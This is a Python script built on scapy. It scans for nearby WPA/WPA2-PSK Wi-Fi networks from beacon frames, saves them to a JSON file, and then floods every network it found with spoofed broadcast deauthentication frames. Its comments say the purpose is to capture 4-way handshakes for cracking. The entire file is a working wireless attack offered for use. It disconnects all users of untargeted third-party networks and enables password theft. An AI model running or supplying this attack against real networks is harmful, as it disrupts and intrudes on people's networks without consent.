from scapy.all import *
import json
import os
import threading

# NOTES:
# Beacon frames are used by Wifi networks to announce that they are available.
# This attack cannot be performed on WPA3 Networks

networks = []

# Enumerate and find Wifi networks using Beacon frames
def WifiEnumeration(packet):
    # check if packets are beacon packets:
    if packet.haslayer(Dot11Beacon):
        # Extract Intel: BSSID and SSID
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11Elt].info.decode()

        # Extract Secondary Intel: Channel and Cryptographic Algorithm
        # Extract Network Stats
        stats = packet[Dot11Beacon].network_stats()
        # Get intel
        channel = stats.get('channel')
        crypto = list(stats.get('crypto'))

        # Extra information: Attack Validation
        if "WPA/PSK" in crypto or "WPA2/PSK" in crypto:
            # All intel acquired
            # Save Intel
            data = {"ssid": ssid, "bssid": bssid, "channel": channel, "crypto": crypto}
            networks.append(data)

# Run attack with acquired Intel
# Send Deauthentication attack to aid with 4-way Handshake capture
def deauth_attack(ap_mac, channel):
    os.system(f"sudo iwconfig wlan0 channel {channel}")
    pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
    sendp(pkt, iface="wlan0", count=100, inter=0.1)

def write_networks():
    with open('wifi_networks.json', 'w') as f:
        json.dump(networks, f)

if __name__ == '__main__':
    # Sniff for WiFi networks
    sniff(prn=WifiEnumeration, iface='wlan0', timeout=10)
    write_networks()

    # Run deauth attack
    with open("wifi_networks.json", "r") as f:
        saved_networks = json.load(f)

    # Starting threads for each network found
    for network in saved_networks:
        ap_mac = network["bssid"]
        channel = network["channel"]
        deauther = threading.Thread(target=deauth_attack, args=(ap_mac, channel))
        deauther.daemon = True
        deauther.start()